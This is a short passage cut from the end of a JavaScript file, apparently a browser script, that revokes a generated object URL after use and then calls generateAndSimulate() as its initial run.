      URL.revokeObjectURL(url);
    });
  }

  // Initial Run
  generateAndSimulate();
});
